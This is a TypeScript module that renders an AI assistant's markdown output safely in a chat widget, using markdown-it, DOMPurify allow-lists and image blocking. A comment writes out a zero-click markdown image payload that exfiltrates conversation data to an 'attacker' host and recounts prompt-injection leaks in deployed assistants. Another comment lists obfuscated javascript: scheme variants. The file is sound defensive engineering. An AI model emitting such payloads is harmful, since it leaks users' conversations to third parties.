import DOMPurify from 'dompurify';
/**
 * markdown-it 15 SHIPS ITS OWN TYPES and the default export is a value, not a type.
 *
 * Its `.d.mts` ends with:
 *   export { type MarkdownIt, …, type RendererRule, type Token, MarkdownItCallable as default }
 *
 * so the DEFAULT import binds `MarkdownItCallable` — a value of type `typeof MarkdownIt & (…)`,
 * callable with or without `new`. There is no type of that name, which is why annotating with the
 * default binding produced `TS2749: 'MarkdownIt' refers to a value, but is being used as a type`.
 * The instance type is a separate NAMED, type-only export that happens to share the name, so it is
 * imported under an alias rather than shadowed.
 *
 * Note `@types/markdown-it@14.1.2` is still in devDependencies and is now dead weight: under
 * `moduleResolution: bundler` TypeScript takes the package's own `exports.import.types`, so the
 * DefinitelyTyped v14 stubs are never consulted against a v15 runtime. Flagged, not removed — that
 * is a manifest and lockfile change, not a type fix.
 */
import MarkdownIt, {
  type MarkdownIt as MarkdownItInstance,
  type RendererRule,
  type Token,
} from 'markdown-it';

/**
 * THE LAZY CHUNK.
 *
 * The filename is load-bearing. Rolldown derives a chunk's default name from the MODULE FILENAME,
 * so this file must be `renderer.ts` for the emitted chunk to be `renderer-<hash>.js` and for the
 * `.size-limit.json` entry watching `renderer-*.js` to match anything at all. Named `markdown.ts`
 * it would emit `markdown-*.js`, the glob would match nothing, and the 60 kB budget would pass
 * silently forever.
 *
 * It is lazy because markdown-it plus DOMPurify does not fit beside a 30 kB app shell, and because
 * the first assistant token is seconds away while the launcher is not. Import it with a dynamic
 * `import()` when the panel opens, never statically.
 *
 * The CONFIGURATION below is reproduced verbatim from `kb-security-baseline` →
 * `references/widget-embedding-and-output.md` and invents nothing. "One renderer everywhere" is a
 * rule about configuration: one call site with a looser `ALLOWED_ATTR` forks it just as completely
 * as a second copy of the code.
 *
 * NOTHING ENFORCES THAT TODAY. This file holds the monorepo's only `DOMPurify.sanitize` call —
 * apps/web carries the dependency in package.json with no sanitizer call site, apps/mobile renders
 * a <Text> tree — so the rule is not "keep the copies in sync", it is "a second one must not
 * appear", and the control is a reviewer. docs/17 §22.5 is a list of security tests to write, one
 * bullet of which is "XSS in source content"; the corpus itself does not exist, the two services'
 * security-test READMEs name it as planned work, apps/widget/tests holds no renderer case, and
 * gates.yml runs nothing under apps/. Once that corpus exists it becomes the control here — and
 * every renderer has to be wired into it, because a second renderer the corpus never calls is
 * invisible to the corpus. Even then it is partial: a grep can find a second `DOMPurify.sanitize`,
 * but nothing can compare two sanitizer configs for equivalent strictness, which is why the
 * paragraph above stays a rule a reviewer applies and not a check CI runs.
 */

const md: MarkdownItInstance = new MarkdownIt({
  // THE PRIMARY CONTROL, and markdown-it's own default. Its safety doc: "Don't enable HTML…
  // Output will be safe without sanitizer." It also blocks javascript:, vbscript:, file: and all
  // data: except gif/png/jpeg/webp via validateLink. `marked` removed its sanitize option in v8
  // and has no equivalent link-scheme filtering, which would make DOMPurify the SOLE barrier.
  html: false,
  // linkify turns bare text into anchors, which is one more way for model output to produce a
  // clickable destination we did not choose.
  linkify: false,
  breaks: true,
});

/**
 * NEVER AUTO-LOAD A MODEL-EMITTED IMAGE.
 *
 * `![](https://attacker/?d=<conversation>)` is a zero-click GET to an attacker-chosen URL with
 * attacker-chosen query parameters. Nothing about it is XSS — a correct sanitizer passes it,
 * because it is a valid non-scripting <img>. Demonstrated against the Azure OpenAI Playground in
 * 2023 (the model "correctly URL encoded the data"); recurred as EchoLeak, CVE-2025-32711,
 * CVSS 9.3, in Microsoft 365 Copilot, where the prompt-side classifier was bypassed.
 *
 * THREE INDEPENDENT LAYERS, all of them: this rule, `img` excluded from ALLOWED_TAGS below, and
 * `img-src 'self' data:` in the iframe's CSP. The last is the one that survives a DOMPurify
 * bypass, which you should assume you will need.
 */
/**
 * ANNOTATED WITH `RendererRule` RATHER THAN LEFT TO INFERENCE, and in this file that is a security
 * property rather than a style preference.
 *
 * `Renderer.rules` is `Record<string, RendererRule>`, so contextual typing alone would now supply
 * `tokens: Token[]` and `idx: number`. It did not before, because the annotation on `md` above was a
 * type error: `md` degraded to the error type, `md.renderer.rules[…]` with it, and both parameters
 * landed as implicit `any` in the one function in the widget that turns MODEL OUTPUT into DOM.
 * `kb-security-baseline` treats generated content as permanently hostile, and `any` here meant
 * `token.content` was `any` too — so `escapeHtml()` was being handed an unconstrained value with the
 * compiler unable to say it was even a string. Naming the type restores that guarantee, and naming
 * it explicitly means a future edit that breaks the `md` annotation fails HERE instead of silently
 * reverting to `any` again.
 *
 * `Token | undefined` is real, not defensive: `noUncheckedIndexedAccess` is on, and a renderer rule
 * can be invoked with an index past the end of the stream by a plugin. The guard was already
 * correct — it is now correct for a reason the compiler checks.
 */
const blockImage: RendererRule = (tokens, idx) => {
  // `security/detect-object-injection` flags the computed index. `idx` is markdown-it's own position
  // in the token stream it just produced, typed `number` by `RendererRule`, and the result is
  // narrowed for `undefined` on the next line — it is an array read, not a property lookup by an
  // attacker-chosen key. (The token's CONTENT is hostile; the index is not.)
  // eslint-disable-next-line security/detect-object-injection -- array index from markdown-it, typed number
  const token: Token | undefined = tokens[idx];
  const alt = token === undefined ? '' : md.utils.escapeHtml(token.content);
  return `<span class="md-image-blocked" data-alt="${alt}">[image]</span>`;
};

md.renderer.rules['image'] = blockImage;

/**
 * External links: `noopener` stops reverse tabnabbing through `window.opener` (the implicit
 * browser behaviour does not cover `window.open()` or older embedded webviews on customer sites).
 * `noreferrer` is an EXFILTRATION control here — without it a model-emitted link leaks the widget
 * URL, and with it the bot id and conversation context, to the destination in the `Referer`.
 *
 * Registered once at module scope. Hooks must never MUTATE CONFIG: `setConfig()` and a
 * config-mutating hook permanently pollute `ALLOWED_ATTR` for every later call.
 */
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node instanceof Element && node.tagName === 'A' && node.hasAttribute('href')) {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer nofollow ugc');
  }
});

/**
 * markdown-it (html:false) → DOMPurify (ARRAY config, RETURN_DOM_FRAGMENT) → `replaceChildren`.
 *
 * mXSS is why the fragment is never re-serialized: a string safe as parsed becomes unsafe when
 * re-serialized and re-parsed, because HTML serialization is not the inverse of parsing at foreign
 * content boundaries (<svg>, <math>, <template>). Round-tripping sanitized output back through a
 * string — `el.innerHTML = DOMPurify.sanitize(x)`, then reading `el.innerHTML` and assigning it
 * elsewhere — voids the sanitization entirely.
 */
export function renderMarkdown(container: Element, markdown: string): void {
  const fragment = DOMPurify.sanitize(md.render(markdown), {
    ALLOWED_TAGS: [
      'p',
      'br',
      'strong',
      'em',
      'del',
      'code',
      'pre',
      'blockquote',
      'ul',
      'ol',
      'li',
      'a',
      'h1',
      'h2',
      'h3',
      'h4',
      'table',
      'thead',
      'tbody',
      'tr',
      'th',
      'td',
      'hr',
      'span',
    ],
    // PLAIN ARRAYS ONLY. The function/predicate forms of ADD_TAGS/ADD_ATTR bypass FORBID_TAGS
    // through a short-circuit asymmetry and SKIP URI VALIDATION ENTIRELY (CVE-2026-65912).
    ALLOWED_ATTR: ['href', 'title', 'class'],
    // A SCHEME ALLOW-LIST, never a block-list. Blocking javascript:/data:/vbscript: misses blob:,
    // filesystem:, about:, custom protocol handlers, and every case/whitespace/entity variant
    // (jAvAsCrIpT:, java\tscript:, java&#x09;script:, leading NULs).
    ALLOWED_URI_REGEXP: /^https?:\/\//i,
    ALLOW_DATA_ATTR: false,
    // Never re-serialize (see mXSS above). And never IN_PLACE — seven distinct 2026 CVEs:
    // cross-realm bypass, clobbered-root attributes, attacker-controlled nodeName, shadow roots
    // inside <template>.content.
    RETURN_DOM_FRAGMENT: true,
  });

  // `replaceChildren`, not innerHTML. The node goes in as a node.
  container.replaceChildren(fragment);
}
